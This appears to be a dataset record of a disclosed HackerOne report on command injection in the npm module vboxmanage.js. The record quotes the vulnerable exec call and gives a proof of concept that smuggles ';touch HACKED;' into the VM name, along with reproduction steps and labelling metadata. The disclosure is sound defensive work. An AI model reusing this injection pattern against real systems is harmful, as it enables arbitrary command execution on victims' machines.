@@ -1,0 +1,53 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "d3lla ",
+  "title": "[vboxmanage.js] Command Injection via insecure command concatenation",
+  "content": "\nI would like to report a Command Injection issue in the vboxmanage.js module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: vboxmanage.js\nversion: 1.0.6\nnpm page: https://www.npmjs.com/package/vboxmanage.js\nModule Description\nA wrapper for VirtualBox CLI with Promises,\nModule Stats\n[2] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any check.\nI tested the start function.\nHere's the code which causes the issue:\nCode 1.30 KiB\n1// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L76\n2...\n3var\n4    child_process = require('child_process'),\n5...\n6VBoxManage.manage = function (command, options) {\n7\n8    command = command || [];\n9    if (!(command instanceof Array)) {\n10        command = [command];\n11    }\n12\n13    options = options || {};\n14\n15    for (var i = 0; i < command.length; i++) {\n16        command[i] = escapeArg(command[i]);\n17    }\n18\n19    Object.keys(options).forEach(function (option) {\n20\n21        command.push('--' + option);\n22        var value = options[option];\n23\n24        if (value !== true) {\n25            command.push(escapeArg(value));\n26        }\n27\n28    });\n29\n30    if (VBoxManage.debug) {\n31        console.warn(\"$ VBoxManage \" + command.join(\" \"));\n32    }\n33\n34    return new Promise(function (resolve, reject) {\n35\n36        child_process.exec(vBoxManageBinary + ' ' + command.join(' '), {}, function (err, stdout, stderr) {  // <-- injection\n37\n38            if (err) {\n39                err.stderr = stderr;\n40                return reject(err);\n41            }\n42\n43            return resolve({ stdout: stdout, stderr: stderr });\n44\n45        });\n46\n47    });\n48};\n49...\n50VBoxManage.start = function (vmname, gui, options) {\n51    options = options || {};\n52    options['type'] = gui ? 'gui' : 'headless';\n53    return this.manage(['-nologo', 'startvm', vmname], options); // <-- user input\n54};\n55...\nThe vmname parameter is used to build the command that is passed to the child_process.exec function without any check.\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall vboxmanage.js module:\nnpm i vboxmanage.js\nnpm i vboxmanage.js\ncreate the following PoC JavaScript file (poc.js):\nCode 112 Bytes\n1var VBox = require('vboxmanage.js');\n2VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFile or child_process.spawn functions instead of child_process.exec.\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on vboxmanage.js module via insecure command concatenation.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1597928880,
+  "report_url": "https://hackerone.com/reports/864777",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install vboxmanage.js module: npm i vboxmanage.js"
+    ],
+    [
+      2,
+      "Create a PoC JavaScript file (poc.js) with the following content: var VBox = require('vboxmanage.js'); VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});"
+    ],
+    [
+      3,
+      "Execute the poc.js file: node poc.js"
+    ],
+    [
+      4,
+      "Verify the HACKED file is created: ls"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a command injection issue in the vboxmanage.js module, where user input (vmname) is used to build a command that is executed without proper sanitization. This allows an attacker to execute arbitrary commands on the victim's PC.",
+  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of insecure command concatenation. The attack does not require multiple components or complex interactions, and the exploitation is direct once the vulnerable code path is identified.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via insecure command concatenation in the vboxmanage.js module, where user input (vmname) is directly used in a command executed by child_process.exec. This is a security issue within the application's handling of user input and command execution, not an authentication or authorization bypass. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are different from command injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
